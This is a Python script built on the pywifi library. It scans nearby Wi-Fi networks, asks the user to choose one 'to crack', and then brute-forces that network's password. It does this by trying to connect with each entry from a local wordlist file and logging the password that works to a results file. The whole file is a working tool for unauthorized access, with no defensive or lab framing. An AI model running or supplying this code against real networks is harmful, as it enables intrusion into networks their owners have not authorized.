import pywifi
import time
from pywifi import profile,const

    #scan
def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    print('%s start scaning>>>>>>>' %(iface.name()) )
    iface.scan()
    time.sleep(3)
    wifi_List = iface.scan_results()
    for m in wifi_List:
        print( m,"----------",m.ssid )
    # print( len(wifi_List) )
    if len(wifi_List)!= 0 :
        print("catched wifi list:")
        for i_wifi in wifi_List:
            print("[%d]  %s" %(wifi_List.index(i_wifi)+1,i_wifi.ssid))
            print( "bssid--%s,ssid--%s,freq--%s,auth--%s,akm--%s,signal--%s,cipher--%s" %(i_wifi.bssid,i_wifi.ssid,i_wifi.freq,i_wifi.auth,i_wifi.akm,i_wifi.signal,i_wifi.cipher ) )
    print("----please input the number of wifi which to crack!----")
    wifi_name = int(input())-1
    print("---start crack %s----" %(wifi_List[wifi_name].ssid))
    # print( "bssid--%s,ssid--%s,freq--%s,auth--%s,akm--%s,signal--%s,cipher--%s" %(wifi_List[wifi_name].bssid,wifi_List[wifi_name].ssid,wifi_List[wifi_name].freq,wifi_List[wifi_name].auth,wifi_List[wifi_name].akm,wifi_List[wifi_name].signal,wifi_List[wifi_name].cipher ) )
    profile = pywifi.Profile()
    profile.ssid = wifi_List[wifi_name].ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm = wifi_List[wifi_name].akm
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = ''
    iface.remove_all_network_profiles()
    iface.disconnect()
    return profile
    
def start_crack_wifi():
    password = ""
    profile = scan_wifi()
    # print(profile.ssid,profile.akm,profile.auth,profile.key)
    # read password_text
    print("  start!  ")
    # read only
    with open('E:/password.txt','r+') as pw_file:
        temp_pw = pw_file.readline()
        num = 1
        while temp_pw:
            # print(" test password %s " %(temp_pw))
            profile.key = temp_pw
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            temp_profile = iface.add_network_profile(profile)
            iface.connect( temp_profile )
            time.sleep(3)
            if iface.status() == const.IFACE_CONNECTED:
                password = temp_pw
                with open('E:/result.txt','a+') as re_file:
                    re_file.write('wifi:%s-------pw:%s \r' %(profile.ssid,password))
                re_file.close()
                break
            else:
                print("the %d test: No!  %s " %(num,temp_pw) )
                num += 1
            temp_pw = pw_file.readline()
    pw_file.close()
    return password


def deadLine():
    num = 1
    with open('E:/pp.txt','r+') as pw_file:
        temp_pw = pw_file.readline()
        while temp_pw:
            temp_pw = pw_file.readline()
            num += 1
        print( num )
    pw_file.close()
    return None


if __name__ == "__main__":
    pw = start_crack_wifi()
    if pw != "":
        print( "wifi's password is %s" %pw)
    # deadLine()
